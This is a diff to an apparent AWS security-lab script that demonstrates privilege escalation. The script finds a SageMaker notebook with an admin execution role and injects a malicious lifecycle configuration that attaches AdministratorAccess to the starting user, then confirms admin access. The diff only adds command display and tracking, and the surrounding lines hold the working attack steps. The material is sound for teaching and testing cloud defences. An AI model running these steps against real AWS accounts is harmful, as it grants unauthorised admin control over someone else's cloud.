@@ -5,7 +5,9 @@
 # a malicious lifecycle configuration into an existing notebook instance to execute
 # code with the notebook's admin execution role.
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -13,6 +15,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-sagemaker-005-to-admin-starting-user"
@@ -73,6 +93,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -84,6 +105,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -91,6 +113,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd aws iam list-users --max-items 1
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -101,10 +124,12 @@ echo ""
 # Step 5: Discover and describe target notebook
 echo -e "${YELLOW}Step 5: Discovering target SageMaker notebook instance${NC}"
 echo "Listing notebook instances..."
+show_cmd aws sagemaker list-notebook-instances --region $AWS_REGION --output table
 aws sagemaker list-notebook-instances --region $AWS_REGION --output table
 
 echo ""
 echo "Describing target notebook: $NOTEBOOK_NAME"
+show_cmd aws sagemaker describe-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --region $AWS_REGION --output json
 NOTEBOOK_INFO=$(aws sagemaker describe-notebook-instance \
     --notebook-instance-name $NOTEBOOK_NAME \
     --region $AWS_REGION \
@@ -118,9 +143,11 @@ echo "Notebook execution role: $NOTEBOOK_ROLE"
 echo ""
 
 echo "Verifying the notebook's execution role has admin permissions..."
+show_cmd aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query "Role.{RoleName:RoleName,Arn:Arn}" --output table
 aws iam get-role --role-name $NOTEBOOK_ROLE_NAME --query 'Role.{RoleName:RoleName,Arn:Arn}' --output table
 echo ""
 echo "Checking attached policies..."
+show_cmd aws iam list-attached-role-policies --role-name $NOTEBOOK_ROLE_NAME --output table
 aws iam list-attached-role-policies --role-name $NOTEBOOK_ROLE_NAME --output table
 
 echo -e "${GREEN}✓ Target notebook found with admin execution role${NC}\n"
@@ -206,7 +233,9 @@ echo "This lifecycle config will grant admin access to the starting user..."
 
 # Create the malicious script that will run with the notebook's admin role
 LIFECYCLE_SCRIPT='#!/bin/bash
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 # This script runs with the notebook execution role credentials (admin access)
 echo "Lifecycle script executing with notebook role credentials..."
 aws iam attach-user-policy \
@@ -220,6 +249,7 @@ ENCODED_SCRIPT=$(echo "$LIFECYCLE_SCRIPT" | base64)
 
 # Create the lifecycle configuration
 echo "Creating lifecycle config: $LIFECYCLE_CONFIG_NAME"
+show_attack_cmd aws sagemaker create-notebook-instance-lifecycle-config --notebook-instance-lifecycle-config-name $LIFECYCLE_CONFIG_NAME --region $AWS_REGION --on-start Content="$ENCODED_SCRIPT" --output json
 aws sagemaker create-notebook-instance-lifecycle-config \
     --notebook-instance-lifecycle-config-name $LIFECYCLE_CONFIG_NAME \
     --region $AWS_REGION \
@@ -238,6 +268,7 @@ echo -e "${GREEN}✓ Malicious lifecycle config created${NC}\n"
 echo -e "${YELLOW}Step 8: Updating notebook with malicious lifecycle config${NC}"
 echo "Attaching lifecycle config to notebook: $NOTEBOOK_NAME"
 
+show_attack_cmd aws sagemaker update-notebook-instance --notebook-instance-name $NOTEBOOK_NAME --lifecycle-config-name $LIFECYCLE_CONFIG_NAME --region $AWS_REGION --output json
 aws sagemaker update-notebook-instance \
     --notebook-instance-name $NOTEBOOK_NAME \
     --lifecycle-config-name $LIFECYCLE_CONFIG_NAME \
@@ -332,6 +363,7 @@ echo -e "${YELLOW}Step 11: Verifying administrator access${NC}"
 echo "Testing if we now have admin permissions..."
 echo "Attempting to list IAM users..."
 
+show_cmd aws iam list-users --max-items 3 --output table
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -361,6 +393,13 @@ echo "  $STARTING_USER → StopNotebookInstance → CreateLifecycleConfig"
 echo "  → UpdateNotebookInstance → StartNotebookInstance"
 echo "  → Lifecycle Script (executes with admin role) → Admin Access"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Lifecycle configuration created: $LIFECYCLE_CONFIG_NAME"
 echo "- AdministratorAccess policy attached to: $STARTING_USER"
@@ -370,3 +409,6 @@ echo -e "\n${RED}⚠ Warning: Multiple changes made to the environment${NC}"
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
